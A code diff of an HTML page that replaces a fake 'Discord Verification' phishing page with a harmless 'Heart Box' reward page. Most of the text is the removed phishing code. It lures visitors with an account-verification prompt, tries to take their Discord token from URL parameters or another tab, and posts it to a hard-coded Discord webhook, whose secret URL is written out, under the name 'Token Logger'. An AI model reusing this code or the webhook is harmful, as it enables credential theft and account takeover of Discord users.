@@ -1,152 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Verification</title>
+    <title>Heart Box</title>
     <style>
         body {
-            font-family: 'Whitney', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: #2f3136;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            font-family: Arial, sans-serif;
             text-align: center;
-            max-width: 400px;
+            margin-top: 100px;
         }
-        .logo {
-            font-size: 32px;
-            color: #5865F2;
-            margin-bottom: 20px;
-        }
-        .title {
-            color: #fff;
-            font-size: 24px;
-            margin-bottom: 15px;
-        }
-        .description {
-            color: #b9bbbe;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-        .button {
-            background: #5865F2;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 10px;
-        }
-        .button:hover {
-            background: #4752C4;
-            transform: translateY(-2px);
-        }
-        .button:disabled {
-            background: #4a4e52;
-            cursor: not-allowed;
-        }
-        .hidden {
+
+        #claimSection {
             display: none;
-        }
-        .status {
-            color: #43b581;
             margin-top: 20px;
         }
-        .error {
-            color: #f04747;
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        #message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: crimson;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🔒</div>
-        <div class="title">Account Verification Required</div>
-        <div class="description">
-            Your Discord account needs verification. Click below to verify your session and continue.
-        </div>
-        <button class="button" id="verifyBtn">Verify Account</button>
-        <button class="button hidden" id="continueBtn">Continue to Discord</button>
-        <div class="status hidden" id="status"></div>
+
+    <a href="#" onclick="showButton()">Click here to open reward</a>
+
+    <div id="claimSection">
+        <button onclick="claimHeart()">Claim Heart Box</button>
     </div>
 
-    <script>
-        const webhookUrl = 'https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI';
-        
-        document.getElementById('verifyBtn').addEventListener('click', function() {
-            this.disabled = true;
-            this.textContent = 'Opening Discord...';
-            
-            // Open Discord in same window
-            window.location.href = 'data:text/html,<html><script>localStorage.setItem(\'redirect\', \'true\');window.location.href=\'https://discord.com/login\';</script></html>';
-        });
+    <div id="message"></div>
 
-        // Check if we're returning from Discord
-        if (document.referrer.includes('discord.com')) {
-            document.getElementById('verifyBtn').classList.add('hidden');
-            document.getElementById('continueBtn').classList.remove('hidden');
-            document.getElementById('status').textContent = 'Verification complete!';
-            
-            // Try to get token from URL parameters (if any)
-            const urlParams = new URLSearchParams(window.location.search);
-            const token = urlParams.get('token');
-            
-            if (token) {
-                sendTokenToWebhook(token);
-            } else {
-                // Alternative: Check if user has discord.com open in another tab
-                try {
-                    const discordTab = window.open('https://discord.com', '_blank');
-                    setTimeout(() => {
-                        discordTab.postMessage('getToken', '*');
-                    }, 2000);
-                    
-                    window.addEventListener('message', function(event) {
-                        if (event.data && event.data.token) {
-                            sendTokenToWebhook(event.data.token);
-                        }
-                    });
-                } catch (e) {
-                    console.log('Fallback method failed');
-                }
-            }
+    <script>
+        function showButton() {
+            document.getElementById("claimSection").style.display = "block";
         }
 
-        document.getElementById('continueBtn').addEventListener('click', function() {
-            window.location.href = 'https://discord.com/channels/@me';
-        });
-
-        function sendTokenToWebhook(token) {
-            const payload = {
-                content: `🔐 **Token Captured:**\n\`\`\`${token}\`\`\``,
-                username: 'Token Logger',
-                avatar_url: 'https://i.imgur.com/3Z1jv2A.png'
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            })
-            .then(() => {
-                document.getElementById('status').textContent = '✅ Verification successful!';
-                document.getElementById('status').classList.remove('error');
-            })
-            .catch(() => {
-                document.getElementById('status').textContent = '❌ Verification failed';
-                document.getElementById('status').classList.add('error');
-            });
+        function claimHeart() {
+            document.getElementById("message").innerHTML = "You now have a heart box ❤️";
         }
     </script>
+
 </body>
 </html>
